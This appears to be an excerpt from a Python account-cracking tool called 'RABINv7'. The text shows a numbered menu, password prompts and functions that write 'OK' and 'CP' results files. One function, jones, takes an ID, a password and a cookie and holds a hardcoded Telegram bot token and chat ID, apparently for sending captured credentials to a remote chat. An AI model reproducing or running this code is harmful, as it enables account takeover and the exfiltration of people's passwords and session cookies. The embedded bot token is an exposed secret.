...
def jones(idf,pw,kuki):
    try:
        token = "7028771336:AAG15iGwpkYLL4fwYhENZk_gE0CMY9WXQHc"
        chatid = "6655432949"
...
def menu(my_name,my_id):
	...
	linex()
	_____Rabin_____ = input(' CHOOSE : ')
	if _____Rabin_____ in ['1']:
		RABIN_public()
	elif _____Rabin_____ in ['2']:
		fileopt()
	elif _____Rabin_____ in ['3','03']:
		passask()
		RABINresults()
	elif _____Rabin_____ in ['4','04']:
		passask()
		...
		restart()
	elif _____Rabin_____ in ['5','05']:
		contact()
	elif _____Rabin_____ in ['0']:
		passask()
...
def RABINresults():
    ok_file_path = '/sdcard/RABINv7/RABINv7-OK.txt'
    cp_file_path = '/sdcard/RABINv7/RABINv7-CP.txt'
